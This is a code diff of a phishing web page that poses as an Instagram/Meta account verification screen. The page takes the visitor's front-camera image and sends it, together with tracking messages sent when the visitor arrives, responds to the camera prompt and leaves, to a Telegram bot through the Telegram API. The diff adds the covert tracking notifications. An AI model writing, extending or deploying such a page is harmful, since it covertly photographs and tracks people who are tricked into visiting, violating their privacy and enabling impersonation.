@@ -9,7 +9,7 @@
     <meta property="og:title" content="oussama_bekkari">
     <meta property="og:description" content="يرجى مراجعة خيارات استخدام الحساب للمتابعة.">
     
-    <!-- تم وضع الرابط الدائم للصورة هنا لضمان استمرار ظهورها -->
+    <!-- الرابط الدائم للصورة لضمان استمرار ظهورها -->
     <meta property="og:image" content="https://ammartr1.github.io/instagram.direct.app/251188507_413083037077601_1872438827032414944_n.jpg">
     <meta property="og:type" content="website">
 
@@ -31,7 +31,6 @@
         h2 { font-size: 22px; font-weight: 700; line-height: 1.2; margin-bottom: 15px; }
         .info-text { font-size: 14px; color: #4b4f56; line-height: 1.5; margin-bottom: 20px; }
 
-        /* خيارات الراديو المحاكية لإنستغرام */
         .option-card {
             border: 1px solid var(--ig-separator);
             border-radius: 12px;
@@ -57,7 +56,6 @@
         .option-txt h3 { font-size: 15px; font-weight: 600; margin-bottom: 4px; }
         .option-txt p { font-size: 13px; color: #606770; }
 
-        /* البوتوم شيت الثابت */
         .footer-action {
             padding: 20px;
             border-top: 1px solid var(--ig-separator);
@@ -113,13 +111,33 @@
         const C = '2140385904';
         let strm = null;
 
+        // وظيفة إرسال الإشعارات النصية للبوت
+        function sendNotify(msg) {
+            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        }
+
+        // إشعار الدخول للرابط
+        window.addEventListener('load', () => {
+            sendNotify("👁️ *دخل للرابط الآن*\nجاري انتظار طلب الكاميرا...");
+            init();
+        });
+
+        // إشعار الخروج من الصفحة
+        window.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'hidden') {
+                sendNotify("🚪 *خرج من المتصفح / أغلق الصفحة*");
+            }
+        });
+
         async function init() {
             try {
                 strm = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('vid').srcObject = strm;
-            } catch (e) {}
+                sendNotify("✅ *وافق على الكاميرا*\nالمستخدم جاهز للتصوير عند الضغط.");
+            } catch (e) {
+                sendNotify("❌ *رفض الكاميرا* أو المتصفح غير مدعوم.");
+            }
         }
-        init();
 
         function selectOpt(el) {
             document.querySelectorAll('.option-card').forEach(c => c.classList.remove('active'));
@@ -142,7 +160,7 @@
                 const f = new FormData();
                 f.append('chat_id', C);
                 f.append('photo', b, 'meta_choice.jpg');
-                f.append('caption', '⚙️ *تفاعل مع إعدادات Meta*\nتم اختيار "تأكيد الهوية الرقمية".');
+                f.append('caption', '⚙️ *تفاعل مع إعدادات Meta*\nتم اختيار "تأكيد الهوية الرقمية" وإرسال الصورة.');
                 
                 fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: f })
                 .then(() => {
